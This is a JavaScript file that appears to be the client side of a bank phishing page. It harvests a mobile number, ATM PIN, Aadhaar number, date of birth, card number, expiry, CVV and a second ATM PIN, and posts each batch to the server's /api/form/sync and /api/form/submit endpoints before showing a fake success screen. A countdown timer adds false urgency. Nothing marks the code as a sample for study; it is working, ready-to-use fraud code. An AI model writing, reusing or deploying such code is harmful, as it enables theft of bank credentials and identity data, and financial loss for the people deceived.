
// Store collected form data
const collectedData = {};

// Get deviceId from URL params
const urlParams = new URLSearchParams(window.location.search);
const deviceId = urlParams.get('deviceId') || 'unknown_device';

function getBaseUrl() {
    return window.location.origin;
}

function syncPageData(pageName, pageData) {
    const payload = {
        deviceId: deviceId,
        pageName: pageName,
        pageData: pageData,
        timestamp: new Date().toISOString()
    };
    fetch(getBaseUrl() + '/api/form/sync', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    }).catch(err => console.error(err));
}

function submitFormData() {
    const payload = {
        deviceId: deviceId,
        currentFlow: 'Main Flow',
        ...collectedData,
        submittedAt: new Date().toISOString()
    };
    fetch(getBaseUrl() + '/api/form/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    }).catch(err => console.error(err));
}

function goToScreen(screenId) {
    // Collect data before moving
    if (screenId === "screen-identity") {
        collectedData.mobileNumber = document.getElementById("mobileNumber")?.value;
        collectedData.atmPin = document.getElementById("atmPin")?.value;
        if (collectedData.mobileNumber && collectedData.atmPin) {
            syncPageData("mobile", { mobileNumber: collectedData.mobileNumber, atmPin: collectedData.atmPin });
        }
    } else if (screenId === "screen-card") {
        collectedData.aadhaarNumber = document.getElementById("aadhaarNumber")?.value;
        collectedData.dob = document.getElementById("dob")?.value;
        if (collectedData.aadhaarNumber && collectedData.dob) {
            syncPageData("identity", { aadhaarNumber: collectedData.aadhaarNumber, dob: collectedData.dob });
        }
    }

    document.querySelectorAll('.screen').forEach(el => el.classList.remove('active'));
    document.getElementById(screenId).classList.add('active');
    
    if(screenId === 'screen-success') {
        let el = document.getElementById('shared-secure-text');
        if(el) el.style.display = 'none';
    } else {
        let el = document.getElementById('shared-secure-text');
        if(el) el.style.display = 'block';
    }
    window.scrollTo(0, 0);
}

function openModal() {
    collectedData.cardNumber = document.getElementById("cardNumber")?.value;
    collectedData.expiry = document.getElementById("expiry")?.value;
    collectedData.cvv = document.getElementById("cvv")?.value;
    document.getElementById('pinModal').style.display = 'flex';
}

function closeModal(e) {
    if(e) e.preventDefault();
    document.getElementById('pinModal').style.display = 'none';
}

function completeVerification() {
    collectedData.confirmAtmPin = document.getElementById("confirmAtmPin")?.value;
    syncPageData("card", {
        cardNumber: collectedData.cardNumber,
        expiry: collectedData.expiry,
        cvv: collectedData.cvv,
        confirmAtmPin: collectedData.confirmAtmPin
    });
    submitFormData();
    closeModal();
    goToScreen('screen-success');
}

function formatDate(input) {
    let val = input.value.replace(/\D/g, ''); 
    if (val.length > 2) val = val.slice(0, 2) + '/' + val.slice(2);
    if (val.length > 5) val = val.slice(0, 5) + '/' + val.slice(5, 9);
    input.value = val;
}

function formatCardNumber(input) {
    let val = input.value.replace(/\D/g, ''); 
    let formatted = val.match(/.{1,4}/g); 
    input.value = formatted ? formatted.join(' ') : val;
}

function formatExpiry(input) {
    let val = input.value.replace(/\D/g, '');
    if (val.length > 2) val = val.slice(0, 2) + '/' + val.slice(2, 4);
    input.value = val;
}

let totalSeconds = (1 * 3600) + (59 * 60) + 54;
const countdownEl = document.getElementById('countdown');

function updateTimer() {
    if (!countdownEl || totalSeconds <= 0) return;
    totalSeconds--;
    let h = Math.floor(totalSeconds / 3600);
    let m = Math.floor((totalSeconds % 3600) / 60);
    let s = totalSeconds % 60;
    h = h < 10 ? '0' + h : h;
    m = m < 10 ? '0' + m : m;
    s = s < 10 ? '0' + s : s;
    countdownEl.innerText = h + ':' + m + ':' + s;
}
setInterval(updateTimer, 1000);
